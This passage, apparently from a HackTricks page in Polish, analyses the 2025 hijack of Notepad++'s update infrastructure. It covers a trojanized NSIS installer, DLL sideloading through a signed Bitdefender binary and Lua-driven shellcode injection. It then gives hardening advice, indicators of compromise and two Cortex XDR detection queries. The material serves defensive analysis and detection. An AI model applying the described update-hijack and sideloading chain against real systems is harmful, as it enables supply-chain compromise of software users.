Między czerwcem a grudniem 2025 r. napastnicy, którzy przejęli infrastrukturę hostingową obsługującą przepływ aktualizacji Notepad++, selektywnie udostępniali złośliwe manifesty wybranym ofiarom. Starsze updatery oparte na WinGUp nie weryfikowały w pełni autentyczności aktualizacji, więc wroga odpowiedź XML mogła przekierować klientów na adresy URL kontrolowane przez napastników. Ponieważ klient akceptował treści HTTPS bez wymuszania zarówno zaufanego łańcucha certyfikatów, jak i prawidłowego podpisu PE pobranego instalatora, ofiary pobierały i uruchamiały spreparowany trojanizowany plik NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Przebieg operacji (bez lokalnego exploita):
1. **Przechwycenie infrastruktury**: przejęcie CDN/hostingu i odpowiadanie na żądania sprawdzające dostępność aktualizacji metadanymi napastnika wskazującymi na złośliwy adres URL pobierania.
2. **Trojanizowany NSIS**: instalator pobiera/uruchamia payload i wykorzystuje dwa łańcuchy wykonania:
   - **Własny podpisany plik binarny + sideload**: dołączenie podpisanego pliku Bitdefender `BluetoothService.exe` i umieszczenie złośliwego `log.dll` w jego ścieżce wyszukiwania. Po uruchomieniu podpisanego pliku binarnego Windows wykonuje sideload `log.dll`, który odszyfrowuje i ładuje refleksyjnie backdoor Chrysalis (zabezpieczony przez Warbird + API hashing utrudniający wykrywanie statyczne).
   - **Wstrzykiwanie shellcode przez skrypt**: NSIS uruchamia skompilowany skrypt Lua, który używa Win32 API (np. `EnumWindowStationsW`) do wstrzyknięcia shellcode i przygotowania Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Wnioski dotyczące hardeningu/wykrywania dla każdego autoupdatera:
- Wymuszaj **weryfikację certyfikatu i podpisu** pobranego instalatora (przypnij podpisującego dostawcę, odrzucaj niezgodny CN/łańcuch) i podpisuj sam manifest aktualizacji (np. XMLDSig). Blokuj przekierowania kontrolowane przez manifest, jeśli nie zostały zweryfikowane.
- Traktuj **sideload podpisanego pliku binarnego BYO** jako punkt zwrotny wykrywania po pobraniu: generuj alert, gdy podpisany plik EXE dostawcy ładuje bibliotekę DLL o nazwie pochodzącej spoza kanonicznej ścieżki instalacji (np. Bitdefender ładuje `log.dll` z Temp/Downloads) oraz gdy updater umieszcza/uruchamia instalatory w katalogu tymczasowym, które nie mają podpisów dostawcy.
- Monitoruj **artefakty specyficzne dla malware** zaobserwowane w tym łańcuchu (przydatne jako ogólne punkty analizy): mutex `Global\Jdhfv_1.0.1`, nietypowe zapisy `gup.exe` w `%TEMP%` oraz etapy wstrzykiwania shellcode sterowane przez Lua.
- Notepad++ zareagował, wzmacniając WinGUp w wersji 8.8.9 i nowszych: zwracany XML jest teraz podpisany (XMLDSig), a nowsze kompilacje wymuszają weryfikację certyfikatu i podpisu pobranego instalatora zamiast ufać wyłącznie transportowi.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading podpisanego przez Bitdefender pliku EXE `log.dll` (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> uruchamiający instalator inny niż instalator Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Te wzorce można uogólnić na każdy updater, który akceptuje niepodpisane manifesty lub nie weryfikuje przypiętych sygnatariuszy instalatora — przejęcie ruchu sieciowego + złośliwy instalator + sideloading z własnym podpisem prowadzą do zdalnego wykonania kodu pod pozorem „zaufanych” aktualizacji.

---
## References
- [1] [Ostrzeżenie – Netskope Client dla Windows – lokalna eskalacja uprawnień przez nieautoryzowany serwer (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Ostrzeżenie dotyczące bezpieczeństwa Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – wtyczka Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – klient/eksploit IPC Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre i Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – lokalna eskalacja uprawnień przez zapisywalne pliki w Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – eskalacja uprawnień w agencie Windows](https://checkmk.com/werk/16361)
- [10] [PoC bloatware-pwn od sensepost](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – aktorzy sponsorowani przez państwa wykorzystują łańcuch dostaw Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – aktualizacja informacji o incydencie przejęcia infrastruktury](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – obejście poprawki dla CVE-2025-0309 w Netskope Client dla Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – odkrywanie błędów eskalacji uprawnień w Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
